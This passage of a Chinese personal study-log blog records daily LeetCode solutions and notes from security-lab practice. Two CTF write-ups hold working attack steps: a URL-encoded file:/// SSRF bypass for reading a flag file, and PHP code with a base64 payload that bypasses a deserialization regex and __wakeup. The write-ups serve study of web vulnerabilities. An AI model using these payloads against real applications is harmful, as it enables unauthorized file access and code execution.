花期内花的数目</a></p><p>python3思路：参考官解二分查找。先把flowers中每个列表的第一个数提出来并升序排序，构成starts列表，然后把第二数拿出来升序排序，构成ends列表。然后遍历people，每次进行二分查找，从右边找starts中的值作为起始值，从左边找ends中的值作为结束值，然后用起始值减结束值。这样就表明了有多少个值实在范围内。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-27"><a href="#2023-9-27" class="headerlink" title="2023-9-27"></a>2023-9-27</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-27"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-27-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-27-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-27-1"><p>星火编辑器。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-27-2"><p><a href="https://leetcode.cn/problems/filter-restaurants-by-vegan-friendly-price-and-distance/">1333. 餐厅过滤器</a></p><p>python3思路：按题意将满足条件的值存入字典中，键为等级，值为id列表。然后排序，按键最大id最大的顺序将结果加到res中，返回res。</p><p>时间：<script type="math/tex">O(nlogn)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-26"><a href="#2023-9-26" class="headerlink" title="2023-9-26"></a>2023-9-26</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-26"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-26-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-26-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-26-1"><p>星火编辑器。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-26-2"><p><a href="https://leetcode.cn/problems/pass-the-pillow/">2582. 递枕头</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">passThePillow</span>(<span class="params">self, n: <span class="built_in">int</span>, time: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        temp = time % (<span class="number">2</span> * (n - <span class="number">1</span>)) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> temp &gt; n:</span><br><span class="line">            temp = n - (temp - n)</span><br><span class="line">        <span class="keyword">return</span> temp</span><br></pre></td></tr></table></figure><p>时间：<script type="math/tex">O(1)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-25"><a href="#2023-9-25" class="headerlink" title="2023-9-25"></a>2023-9-25</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-25"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-25-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-25-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-25-1"><p>星火编辑器。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-25-2"><p><a href="https://leetcode.cn/problems/lfu-cache/">460. LFU 缓存</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-24"><a href="#2023-9-24" class="headerlink" title="2023-9-24"></a>2023-9-24</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-24"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-24-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-24-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-24-1"><p>星火编辑器。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-24-2"><p><a href="https://leetcode.cn/problems/lru-cache/">146. LRU 缓存</a></p><p>python3思路：双向链表+字典。字典的键是键，值是链表节点。链表首部表示最近最少被使用，尾部表示最近最多被使用。每次存数据，若数据在字典中，更新值并把节点放入尾部。若数据不在，判断容量，若容量满了，删除首部节点并插入新节点到尾部。没满则直接插入到尾部。取数则先判断存在，存在则取节点后还要把节点放入尾部。</p><p>时间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-23"><a href="#2023-9-23" class="headerlink" title="2023-9-23"></a>2023-9-23</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-23"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-23-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-23-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-23-1"><p>星火编辑器体验。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-23-2"><p><a href="https://leetcode.cn/problems/operations-on-tree/">1993. 树上的操作</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-22"><a href="#2023-9-22" class="headerlink" title="2023-9-22"></a>2023-9-22</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-22"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-22-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-22-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-9-22-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-22-1"><p>笔记整理。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-22-2"><p><a href="https://leetcode.cn/problems/distribute-money-to-maximum-children/">2591. 将钱分给最多的儿童</a></p><p>C++思路：先判断孩子数是否小于钱，小于返回-1。然后设置一个temp为children * 8 - temp，表明分钱后剩余的钱，如果temp为4，孩子数要减2，表明有一个分了8的孩子要分9才能保证钱数没有4。如果temp小于0，孩子数减1，表明有一个孩子要承担剩下的所有的钱。最后返回<code>(temp - children) / 7</code>，表明每个孩子分1块钱后还有多少的孩子能分到8块。返回值为结果。</p><p>时间：<script type="math/tex">O(1)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-22-3"><p>文章整理：html+css，JavaScript，C++。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-21"><a href="#2023-9-21" class="headerlink" title="2023-9-21"></a>2023-9-21</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-21"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-21-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-21-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-9-21-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-21-1"><p>python复习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-21-2"><p><a href="https://leetcode.cn/problems/collect-coins-in-a-tree/description/?envType=daily-question&amp;envId=2023-09-21">2603. 收集树中金币 - 力扣（LeetCode）</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-21-3"><p>python：文章结构更新。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-20"><a href="#2023-9-20" class="headerlink" title="2023-9-20"></a>2023-9-20</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-20"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-20-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-20-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-9-20-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-20-1"><p>安全靶场训练。</p><p>星火编辑器体验。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-20-2"><p><a href="https://leetcode.cn/problems/na-ying-bi/">LCP 06. 拿硬币</a></p><p>C++思路：模拟。直接遍历累加。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-20-3"><p>pikachu：文件上传漏洞。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-19"><a href="#2023-9-19" class="headerlink" title="2023-9-19"></a>2023-9-19</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-19"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-19-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-19-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-9-19-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-19-1"><p>安全靶场训练。</p><p>C++：STL算法。</p><p>星火编辑器体验。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-19-2"><p><a href="https://leetcode.cn/problems/house-robber-iv/">2560. 打家劫舍 IV</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-19-3"><p>pikachu：文件包含。</p><p>C++：STL。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-18"><a href="#2023-9-18" class="headerlink" title="2023-9-18"></a>2023-9-18</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-18"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-18-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-18-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-9-18-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-18-1"><p>安全靶场训练。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-18-2"><p><a href="https://leetcode.cn/problems/house-robber-iii/">337. 打家劫舍 III</a></p><p>python3思路：动态规划 + DFS。</p><p>从根节点出发，有两种选择。一是偷根节点和不偷左右节点，一是不偷根节点和偷左右节点。设定一个dfs遍历全部节点，当root为None返回0,0。否则遍历左右节点，然后求出偷和不偷的值，返回这两个值。dfs结束后在两个值之间取一个最大值即可。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(n)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-18-3"><p>pikachu：命令执行。</p><p>DVWA：命令执行。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-17"><a href="#2023-9-17" class="headerlink" title="2023-9-17"></a>2023-9-17</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-17"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-17-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-17-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-9-17-3">攻防世界【每日】</button></li><li class="tab"><button type="button" data-href="#2023-9-17-4">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-17-1"><p>C++：STL学习</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-17-2"><p><a href="https://leetcode.cn/problems/house-robber-ii/">213. 打家劫舍 II</a></p><p>python3思路：动态规划。在打家劫舍的基础上分两种情况，一种不考虑首，一种不考虑尾。最后在这两者之间取最大值即可。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-17-3"><p>题目名称-SSRF Me</p><ol><li>写一个PHP循环，解出captcha的值。</li><li>包含文件，URL为file:///flag。由于flag会被禁止，所以可以将其进行URL编码。最终结果为file:///%66%6C%61%67。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-17-4"><p>C++：vector，deque。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-16"><a href="#2023-9-16" class="headerlink" title="2023-9-16"></a>2023-9-16</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-16"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-16-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-16-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-16-1"><p>渗透题练习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-16-2"><p><a href="https://leetcode.cn/problems/house-robber/">198. 打家劫舍</a></p><p>python3思路：动态规划。</p><ol><li>子问题：第i个房子所偷的最大的钱。</li><li>确定dp：<code>dp[i] = max(dp[i-2] + dp[i],dp[i-1])</code>，偷i或者不偷i。</li><li>初始化：<code>dp[0] = nums[0],dp[1] = max(num[0],num[1])</code></li><li>遍历顺序：<code>for(int i=2;i&lt;len(nums);i++)</code></li></ol><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-15"><a href="#2023-9-15" class="headerlink" title="2023-9-15"></a>2023-9-15</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-15"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-15-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-15-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-9-15-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-15-1"><p>安全靶场训练。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-15-2"><p><a href="https://leetcode.cn/problems/WHnhjV/">LCP 50. 宝石补给</a></p><p>python3思路：模拟。先模拟一遍，修改gem的值，再<code>return max(gem) - min(gem)</code>即可。</p><p>时间：<script type="math/tex">O(m+n)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-15-3"><p>pikachu：XXE漏洞。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-14"><a href="#2023-9-14" class="headerlink" title="2023-9-14"></a>2023-9-14</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-14"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-14-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-14-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-9-14-3">攻防世界【每日】</button></li><li class="tab"><button type="button" data-href="#2023-9-14-4">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-14-1"><p>安全靶场训练。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-14-2"><p><a href="https://leetcode.cn/problems/queens-that-can-attack-the-king/">1222. 可以攻击国王的皇后</a></p><p>python3思路：模拟。设定八个方向，然后一个for，每次拿出一个方向，设置while循环，如果移动不越界的话，改变king的位置。当该位置有queen时，把结果加到res中，结束while循环。最后返回res即可。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-14-3"><p>这题不会</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-14-4"><p>pikachu：URL跳转和信息泄露。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-13"><a href="#2023-9-13" class="headerlink" title="2023-9-13"></a>2023-9-13</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-13"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-13-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-13-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-9-13-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-13-1"><p>安全靶场训练。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-13-2"><p><a href="https://leetcode.cn/problems/check-knight-tour-configuration/">2596. 检查骑士巡视方案</a></p><p>python3思路：模拟。注意此题有坑。当<code>grid[0][0]</code>不为0的时候，直接返回False即可，因为这不是一个满足条件的有效方案。然后设置八个方向存入元组中。一个while循环，条件是下一个目标点小于所有点数。然后一个for循环，从当前位置开始，当方向合法且存在点是下一个目标点时，目标点值加一，如果八个方向都不是，直接结束while循环。否则就更新下一目标点。最后判断下一目标点是否等于所有点数，等于返回True，否则返回False。</p><p>时间：<script type="math/tex">O(n^2)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-13-3"><p>pikachu：SSRF漏洞。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-12"><a href="#2023-9-12" class="headerlink" title="2023-9-12"></a>2023-9-12</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-12"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-12-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-12-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-9-12-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-12-1"><p>安全靶场训练。</p><p>牛客算法练习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-12-2"><p><a href="https://leetcode.cn/problems/course-schedule-iv/">1462. 课程表 IV</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-12-3"><p>pikachu：CSRF漏洞。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-11"><a href="#2023-9-11" class="headerlink" title="2023-9-11"></a>2023-9-11</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-11"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-11-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-11-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-9-11-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-11-1"><p>安全靶场训练。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-11-2"><p><a href="https://leetcode.cn/problems/course-schedule-iii/">630. 课程表 III</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-11-3"><p>pikachu：XSS漏洞。</p><p>DVWA：XSS漏洞。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-10"><a href="#2023-9-10" class="headerlink" title="2023-9-10"></a>2023-9-10</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-10"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-10-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-10-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-9-10-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-10-1"><p>C++：模板。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-10-2"><p><a href="https://leetcode.cn/problems/course-schedule-ii/">210. 课程表 II</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-10-3"><p>C++：模板。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-9"><a href="#2023-9-9" class="headerlink" title="2023-9-9"></a>2023-9-9</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-9"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-9-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-9-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-9-1"><p>Unity：状态机学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-9-2"><p><a href="https://leetcode.cn/problems/course-schedule/">207. 课程表</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-8"><a href="#2023-9-8" class="headerlink" title="2023-9-8"></a>2023-9-8</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-8"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-8-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-8-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-9-8-3">攻防世界【每日】</button></li><li class="tab"><button type="button" data-href="#2023-9-8-4">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-8-1"><p>安全靶场训练。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-8-2"><p><a href="https://leetcode.cn/problems/calculate-delayed-arrival-time/">2651. 计算列车到站时间</a></p><p>python3思路：相加取模。</p><p>时间：<script type="math/tex">O(1)</script></p><p>空间：<script type="math/tex">O(1)</script></p><p><a href="https://leetcode.cn/problems/serialize-and-deserialize-binary-tree/">297. 二叉树的序列化与反序列化</a></p><p><a href="https://github.com/Magialeaf/Daily_leetcode/blob/main/297. 二叉树的序列化与反序列化.py">my::python代码</a></p><p>python思路：DFS+先序遍历。</p><p>序列化的时候，全局设置一个res，再设置一个dfs函数，每次先判断当前结点是否存在，存在则向res中先添加当前结点的值，然后若左子树存在，添加”L”字符，同理dfs左子树。右子树同理存在添加一个”R”字符然后遍历。最后无论结点是否存在，都添加一个”B”字符，然后返回。最后返回res作为序列化结果。</p><p>反序列化的时候，设置一个dfs函数，传递当前节点和idx=0值。然后每次获得data中的一个字符。设置一个temp。若是L则先判断temp中是否有值，有就添加为当前结点值，然后<code>idx = dfs(node,idx + 1)</code>。R同理。若是B则先判断temp，再<code>return idx + 1</code>。若都不是则<code>temp.append(data[idx])</code>后再<code>idx += 1</code>。</p><p>最后返回最初的根节点即可。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(n)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-8-3"><p>Web——Web_php_unserialize</p><p><code>(preg_match(&#39;/[oc]:\d+:/i&#39;, $var))</code>绕过：<code>O:4:</code>改成<code>O:+4:</code></p><p><code>__wakeup()</code>绕过：<code>&quot;Demo&quot;:1:</code>改成1以上的数字（<code>&quot;Demo&quot;:2:</code>）。因为在 PHP5 &lt; 5.6.25， PHP7 &lt; 7.0.10 的版本存在wakeup的漏洞。当反序列化中object的个数和之前的个数不等时，wakeup就会被绕过。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 注意：因为demofile属性是private属性，所以在序列化的时候会在名字中加入%00（空白符），所以base64编码可以使用如下方式进行，这样可以保证空白符的存在。</span></span><br><span class="line"><span class="variable">$demo</span> = <span class="keyword">new</span> <span class="title class_">Demo</span>(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$demo</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$str</span>));</span><br></pre></td></tr></table></figure><p>payload：<code>?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-8-4"><p>pikachu：反序列化。</p><p>DVWA：SQL注入。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-7"><a href="#2023-9-7" class="headerlink" title="2023-9-7"></a>2023-9-7</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-7"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-7-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-7-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-9-7-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-7-1"><p>安全靶场训练。</p><p>Unity：状态机学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-7-2"><p><a href="https://leetcode.cn/problems/minimum-time-to-repair-cars/">2594. 修车的最少时间</a></p><p>C#思路：二分查找。设置上限和下限。每次判断中间的数值是否满足题意。若满足，调整上限为中间数值。不满足，调整下限为中间数值加一。直到下限大于等于上限跳出循环。返回下限，此时下限就是满足条件的最小时间。</p><p>时间：<script type="math/tex">O(nlog(L))</script>。L为上限。</p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-7-3"><p>pikachu：SQL注入。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas 